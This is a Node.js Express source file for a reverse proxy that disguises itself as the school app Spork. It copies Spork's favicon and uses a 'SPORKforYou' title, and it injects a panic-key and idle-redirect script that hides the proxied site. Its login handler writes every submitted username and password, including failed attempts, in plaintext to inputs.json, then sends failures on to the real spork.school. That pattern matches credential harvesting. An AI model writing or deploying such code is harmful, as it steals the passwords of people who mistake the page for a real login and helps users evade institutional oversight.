const express = require('express');
const session = require('express-session');
const { createProxyMiddleware } = require('http-proxy-middleware');
const bodyParser = require('body-parser');
const cheerio = require('cheerio');
const app = express();
const fs = require('fs');
require('dotenv').config();

const data = fs.readFileSync('inputs.json');
const jsonData = JSON.parse(data);

const username = process.env.USER;
const password = process.env.PASS;
const website = process.env.WEBSITE;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.use(session({
  secret: password,
  resave: false,
  saveUninitialized: true,
}));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/login.html');
});

app.post('/', (req, res) => {
  if (req.body.username === username && req.body.password === password) {
    req.session.loggedIn = true;
    res.redirect('/spork/');
  } else {
    res.redirect('https://spork.school');
  }
  const userData = {
    username: req.body.username,
    password: req.body.password,
  }
  jsonData.users.push(userData);
  var newjson = JSON.stringify(jsonData);
  fs.writeFile('inputs.json', newjson, err => {
    if(err) throw err;
  });   
});

app.use('/spork/', (req, res, next) => {
console.log('Redirected URL:', 'https://robby.blue' + req.url);
  if (req.session.loggedIn) {
    next();
  } else {
    res.redirect('/');
  }
});

app.use((req, res, next) => {
  var _write = res.write;
  var _end = res.end;

  var isHtml = false;
  var chunks = [];

  res.write = function (chunk) {
    if (res.get('Content-Type') && res.get('Content-Type').includes('text/html')) {
      isHtml = true;
      chunks.push(new Buffer(chunk));
    } else {
      _write.call(res, chunk);
    }
  };

  res.end = function (chunk) {
    if (isHtml) {
      if (chunk) chunks.push(new Buffer(chunk));

      var body = Buffer.concat(chunks).toString();
      const $ = cheerio.load(body);

      $('title').text('SPORKforYou');

      $('link[rel="icon"]').attr('href', 'https://app.spork.school/favicon.ico');

      var html = $.html();

      html += `
        <script>
        let idleTime = 0;
        $(document).ready(function () {
            setInterval(timerIncrement, 1000);
            $(this).mousemove(function (e) {
                idleTime = 0;
            });
            $(this).keypress(function (e) {
                idleTime = 0;
            });
        });
    
        function timerIncrement() {
            idleTime = idleTime + 1;
            if (idleTime > 20) {
                window.location.href = '/';
            }
        }
        document.addEventListener('keydown', function(e) {
          if (e.ctrlKey) {
              e.preventDefault();
              window.location.href = window.location.pathname === '/' ? '/spork/' : '/';
          }
      });
        </script>
      `;

      res.setHeader('Content-Length', Buffer.byteLength(html));

      _end.call(res, Buffer.from(html));
    } else {
      if (chunk) _write.call(res, chunk);
      _end.call(res);
    }
  };

  next();
});

app.use('/spork/', createProxyMiddleware({ 
  target: website, 
  changeOrigin: true,
  pathRewrite: {
    '^/spork/': '/', // remove base path
  },
}));

app.listen(3009);
console.log("Sprok started -> http://localhost:3009");